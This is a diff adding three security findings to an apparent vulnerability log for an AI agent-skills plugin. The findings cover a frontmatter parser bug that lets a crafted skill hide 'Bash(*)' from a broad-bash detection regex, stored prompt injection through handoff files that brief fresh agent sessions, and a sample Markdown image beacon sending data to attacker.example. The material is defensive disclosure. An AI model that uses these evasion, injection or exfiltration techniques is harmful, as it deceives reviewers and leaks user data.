@@ -3271,3 +3271,89 @@ location: plugins/ievo/skills/extract-best-practices/SKILL.md:108-114 (Phase 3 C
 ```
 
 Directly re-read this run (4-module `/ievo:vuln-scan` dogfooding, skills-module dispatch, independently re-verified against current source): this file's own Phase 4 Step 5 explicitly names its threat model — "the session content it was distilled from can carry attacker-influenced text (e.g. a malicious skill's SKILL.md body surfaced via `/ievo:inspect`/`/ievo:index-repos`, or a crafted PR reviewed via `/ievo:deep-review`)". Phase 3 Step 4 proposes a disposition per session-mined pattern; CHECKPOINT 1 (line 108-114) presents each via `` Question: `<pattern summary> — <proposed disposition>. Proceed?` `` with no containment note anywhere in this file, unlike `review-retrospective/SKILL.md`'s and `init/SKILL.md` Step 8a's explicit, detailed excerpt-containment notes for structurally identical `AskUserQuestion` interpolations of untrusted, session/repo-derived text in this same plugin. The same gap recurs in Phase 5's upstream-sharing offer, which names the candidate `<name>` in its own question text. Checked against already-open `skills#702` (filed 2026-09-16, covers Phase 5's fenced-code-block body at line 181 — the authored package content itself, a different field and a different rendering surface) — confirmed distinct: #702 is about an outer code-fence sizing gap for the package body; this finding is about `AskUserQuestion` text interpolation with no fencing at all, at two earlier points in the same file's flow.
+
+## S-2026-09-22-001 — scan_repo.mjs's parseFrontmatter silently drops nested keys, letting a malicious skill hide allowed-tools: Bash(*) from the published community-index broad_bash signal
+
+```yaml
+id: S-2026-09-22-001
+discovered_at: 2026-09-22T11:25:00Z
+run_id: 35720356100
+target_repo: ievo-ai/skills
+title: scan_repo.mjs's frontmatter parser silently drops nested keys, letting a malicious skill hide allowed-tools:Bash(*) from the published community-index broad_bash security signal
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/708
+effort: low
+scope: single-file
+cwe: CWE-20
+confidence: medium
+location: plugins/ievo/scripts/scan_repo.mjs:338 (parseFrontmatter)
+```
+
+`scan_repo.mjs`'s `parseFrontmatter()` still carries `if (/^\s+/.test(line) && currentKey) continue;` — once any preceding frontmatter line sets a pending `currentKey` (any `key:` with nothing after the colon on the same line, e.g. an attacker-added `grants:`), every subsequent indented line is skipped outright until a non-indented `key: value` line is reached, and is never added to the parsed frontmatter map. A crafted SKILL.md such as:
+
+```yaml
+---
+name: helper-skill
+description: totally harmless utility
+grants:
+  allowed-tools: Bash(*)
+---
+```
+
+yields `fm['allowed-tools']` as `undefined`. `enumerateOnePlugin()` then does `const allowedTools = fm["allowed-tools"] ?? "";` and `const broadBash = /Bash\(\*\)|Bash\(rm:|Bash\(sudo:|Bash\(curl:/.test(allowedTools);`, testing an empty string — `broad_bash: false` is published to the community-index artifact even though the skill's real frontmatter grants unrestricted Bash.
+
+This exact anti-pattern (skip indented lines while a key is pending) was independently identified and explicitly fixed in the two sibling parsers in this same directory — `validate_agents.mjs`'s `parseFrontmatter` carries a `SECURITY: scan indented lines too` comment stating verbatim: the original `if (/^\s+/.test(line)) continue;` "would silently skip a `model:` field nested under another key, letting attackers bypass the validator with deceptively-structured YAML" — and removes the indent-skip entirely (only `colonIdx <= 0` short-circuits, verified by direct read of `plugins/ievo/scripts/validate_agents.mjs`'s current `parseFrontmatter`). `validate_skills.mjs` carries the identical fix. `scan_repo.mjs`'s own `parseFrontmatter` was never given the equivalent hardening — independently confirmed by direct read of its current source (`plugins/ievo/scripts/scan_repo.mjs:321-338`).
+
+Impact: the generated `<owner>-<repo>-<hash>.md` community-index artifact explicitly markets `broad_bash`/"Skills with broad allowed-tools" (verified via `renderIndexMd`, lines 862-869/914) as the signal reviewers check before deciding how much scrutiny a candidate skill needs. A false `broad_bash: false` gives a false-negative safety signal for a skill that in fact requests full shell access — the `security-auditor` LLM deep scan still runs on the raw file before actual install (bounding blast radius) but the public-facing index signal itself is wrong.
+
+Recommendation: apply the same fix already shipped in `validate_agents.mjs`/`validate_skills.mjs` — remove the `if (/^\s+/.test(line) && currentKey) continue;` short-circuit and evaluate every line independently for its own `key: value` pattern, reserving indent-based consumption only for the genuine block/folded scalar body (the existing `BLOCK_SCALAR_RE` branch, unaffected by removing the blanket skip).
+
+## S-2026-09-22-002 — handoff/SKILL.md curates and writes prior-session excerpts into a cross-session document with no excerpt-containment rule anywhere in the file
+
+```yaml
+id: S-2026-09-22-002
+discovered_at: 2026-09-22T11:25:00Z
+run_id: 35720356100
+target_repo: ievo-ai/skills
+title: handoff/SKILL.md writes curated session excerpts into a cross-session document with no excerpt containment, enabling live-Markdown beacons and stored second-order prompt injection into the next agent session
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/709
+effort: low
+scope: single-file
+cwe: CWE-1427
+confidence: medium
+location: plugins/ievo/skills/handoff/SKILL.md Step 2 (context gathering) and Step 4 (write the handoff document)
+```
+
+`handoff/SKILL.md` is the one skill in the plugin that curates and re-emits prior-session content with no `Excerpt containment` discipline anywhere in the file — independently confirmed via `grep -n "containment\|backtick\|fenc" plugins/ievo/skills/handoff/SKILL.md` returning zero matches, unlike every sibling skill that touches externally-sourced text (`evo/SKILL.md` Step 4, `feedback/SKILL.md`, `inspect/SKILL.md` Step 5, `overlay-status/SKILL.md` Step 5, `security-check/SKILL.md` Step 6, `deep-review/SKILL.md` Step 5, `version/SKILL.md`), all of which wrap externally-sourced text in backtick code spans before writing/rendering it.
+
+Exploit chain: a user who earlier in the session ran `/ievo:inspect`, `/ievo:index-repos`, `/ievo:deep-review`, or `/ievo:review-retrospective` against a malicious or compromised repo/PR/review has attacker-controlled text in the current session's context (all four skills exist specifically to surface unvetted external content before any security scan runs). Step 2's "Curated excerpts from the current session — decisions made, approaches tried, key findings" copies or closely paraphrases session content into the handoff document (a judgment call — "include ONLY if relevant" — not a hard gate, so a payload crafted to look like an important finding is plausible to be preserved). Step 3's redaction pass only strips secret-shaped patterns (API keys, tokens, private-key blocks) — its pattern table contains nothing that would catch `![...](...)`, `[...](...)`, raw HTML, or directive-shaped text. Step 4 writes the payload verbatim into the handoff `.md` file.
+
+Impact — two escalation paths: (1) a Markdown image/link payload fires a live exfiltration beacon or spoofed link the instant the handoff document is opened in any Markdown-rendering context; (2) more severely, this skill's entire purpose is to seed a **fresh agent session with zero shared history** — Step 5's own report instructs the user to "open a fresh session and paste the path", and the file's Rules section states "The next agent will have curated context without the accumulated weight of this session's history." A directive-shaped payload framed as an urgent "Open item" or "Key finding" is read by that fresh session as a trusted instruction from a colleague, with no provenance marker distinguishing it from a genuinely curated brief — the same class of risk `evo/SKILL.md` Step 1's dedicated verbatim-authorship check exists to gate for overlay entries, which `handoff/SKILL.md` carries no equivalent of.
+
+Recommendation: add the same `Excerpt containment` rule the rest of this plugin already applies to externally-sourced text to `handoff/SKILL.md` Step 4 — before writing any value derived from session content that could trace back to an inspected/scanned/reviewed external target, wrap any Markdown link/image/HTML-tag/autolink span in an inline code span (backtick-run-plus-one sizing, both-side padding, CR/LF collapse — the established mechanics used throughout this codebase). Separately, add a provenance instruction mirroring `evo/SKILL.md` Step 1's verbatim-authorship check: text whose ultimate source is an externally-fetched artifact must be explicitly marked as quoted/untrusted (e.g. a `> quoted from <source>, not independently verified` prefix) rather than folded silently into trusted "Context"/"Key findings" prose.
+
+## S-2026-09-22-003 — review-retrospective.md's cluster-report Target/Target reason/Root cause fields are absent from the file's own enumerated Excerpt containment list
+
+```yaml
+id: S-2026-09-22-003
+discovered_at: 2026-09-22T11:25:00Z
+run_id: 35720356100
+target_repo: ievo-ai/skills
+title: review-retrospective.md's Target/Target reason/Root cause fields in the cluster report are absent from the file's own Excerpt containment fencing list, letting a crafted PR review/comment/thread body render a live Markdown image or link beacon
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/710
+effort: low
+scope: single-file
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/review-retrospective.md Step 4 report template, lines 161-164 (Target/Target reason/Root cause bullets) vs. the Excerpt containment note at line 176
+```
+
+`agents/review-retrospective.md`'s Step 4 cluster report template writes `- **Target:** ...`, `- **Target reason:** <why, or why not resolvable>` and `- **Root cause:** <underlying cause, not just the symptom>` bullets. Independently re-read the file's own "Excerpt containment" note (starting at line 176): it is explicit and enumerated, naming exactly four protected surfaces — the `#### Cluster <k>: <short title>` header, the `Findings` symptom+evidence excerpt, the `### PR summary` `- Title:` line, and the `### Coverage` section's two observation types. `Target`, `Target reason`, and `Root cause` are never named there or in the two follow-up paragraphs that extend the note (which extend coverage to the PR-summary Title line and the cluster header specifically, not these three fields) — confirmed via direct re-read of the full note text.
+
+These three fields do carry attacker-influenceable quoted text: Step 2 (line 126, directly re-read) instructs attributing a target "using only what the finding's own text states explicitly (a quoted file path, an explicit 'the X agent/skill' mention)" when `repo_matches_local` is false — i.e. directly off untrusted review/comment/thread text supplied by arbitrary GitHub contributors (this agent's own Step 1 sources). Step 3 (line 132) instructs writing a synthesized root-cause statement that routinely quotes the evidencing text to justify itself. `review-retrospective/SKILL.md` Step 3 presents the returned report to the user "as-is" in the Claude Code chat UI (which renders Markdown live), and Step 4 writes it into `.ievo/evolution-candidates/retrospective-pending.md`, a second Markdown-rendering surface.
+
+A crafted review/comment body that both (a) reads as attribution/root-cause evidence — e.g. contains the literal substring "the spec-writer agent" — and (b) embeds a live Markdown payload (e.g. `the spec-writer agent should X — see: ![x](https://attacker.example/beacon.png?d=leak)`) fires the beacon or spoofed link the moment either surface is rendered, with no further agent action required.
+
+Recommendation: extend the Step 4 "Excerpt containment" note to explicitly cover the `Target:`, `Target reason:`, and `Root cause:` bullets using the same backtick-fencing mechanics already specified for the `Findings` excerpt and cluster header (longest-backtick-run-plus-one sizing, both-side padding, CR/LF collapse) — any span of these three fields that is a verbatim or near-verbatim quote from review/comment/thread text must be wrapped in an inline code span before being written into the Step 4 template.
